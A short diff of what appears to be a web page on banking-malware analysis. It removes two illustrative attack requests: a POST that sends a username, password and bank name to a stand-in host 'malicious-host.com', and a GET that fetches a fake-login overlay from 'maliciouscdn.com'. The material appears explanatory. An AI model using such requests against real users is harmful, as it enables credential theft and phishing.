@@ -74,23 +74,6 @@ Code analysis<br/>
 
 Recommendations</p>
 
-<h2 className="text-blue-500 text-xl">✅ Example 1: Exfiltrating credentials<br/>
 
-Request (POST):
-</h2>
-<p>POST http://malicious-host.com/api/collect_credentials HTTP/1.1<br/>
-Content-Type: application/json<br/>
-User-Agent: BankApp/1.1
-<br/>
 
-  "username": "john_doe",<br/>
-  "password": "mypassword123",<br/>
-  "bank": "FakeBank"<br/>
-
-</p>
-<h2 className="text-blue-500 text-xl">✅ Example 2: Overlay injection for fake login screen
-
-Request (GET):</h2>
-<p>GET http://maliciouscdn.com/layouts/xyzbank_overlay.html
-</p>
 </div>}
